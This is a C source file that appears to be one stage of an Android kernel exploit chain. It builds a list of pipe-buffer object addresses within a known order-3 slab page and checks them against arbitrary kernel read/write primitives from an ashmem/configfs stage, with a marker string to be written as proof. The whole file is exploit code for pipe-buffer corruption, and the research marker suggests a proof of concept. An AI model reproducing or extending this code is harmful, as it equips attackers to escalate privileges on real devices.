#include <errno.h>
#include <stdint.h>
#include <string.h>

#include "08_ashmem_configfs_rw.h"
#include "09_pipe_plan.h"
#include "target.h"

static int plan_direct_range(uint64_t address, size_t length) {
  return address >= TARGET_LINEAR_MAP_BASE &&
         address < TARGET_LINEAR_MAP_END && length != 0 &&
         address <= UINT64_MAX - (length - 1) &&
         address + length <= TARGET_LINEAR_MAP_END;
}

int oss_pipe_plan_build(uint64_t known_order3_base, uint64_t payload_base,
                        struct oss_pipe_plan *plan) {
  static const char proof_string[] = "nebusec_70687973727730";
  uint64_t proof_addr = payload_base + TARGET_PIPE_PROOF_LIVE_OFF;
  if (!plan) {
    errno = EINVAL;
    return 0;
  }
  memset(plan, 0, sizeof(*plan));
  if ((known_order3_base & (TARGET_ORDER3_SIZE - 1)) != 0 ||
      !plan_direct_range(known_order3_base, TARGET_ORDER3_SIZE) ||
      !plan_direct_range(payload_base, TARGET_ORDER3_SIZE) ||
      !oss_kernel_write_plan_supported(proof_addr, sizeof(proof_string)) ||
      !oss_kernel_write_plan_supported(proof_addr, sizeof(uint64_t))) {
    return 0;
  }

  plan->known_order3_base = known_order3_base;
  for (uint64_t off = 0; off < TARGET_ORDER3_SIZE;
       off += TARGET_PIPE_OBJECT_SIZE) {
    uint64_t candidate = known_order3_base + off;
    if (!oss_kernel_read_plan_supported(candidate,
                                        TARGET_PIPE_BUFFER_STRIDE) ||
        !oss_kernel_write_plan_supported(candidate,
                                         TARGET_PIPE_BUFFER_STRIDE)) {
      continue;
    }
    plan->candidates[plan->candidate_count++] = candidate;
  }
  if (plan->candidate_count == 0) {
    errno = EILSEQ;
    return 0;
  }
  plan->ready = 1;
  return 1;
}

int oss_pipe_plan_contains(const struct oss_pipe_plan *plan, uint64_t address) {
  if (!plan || !plan->ready) {
    return 0;
  }
  for (size_t i = 0; i < plan->candidate_count; i++) {
    if (plan->candidates[i] == address) {
      return 1;
    }
  }
  return 0;
}
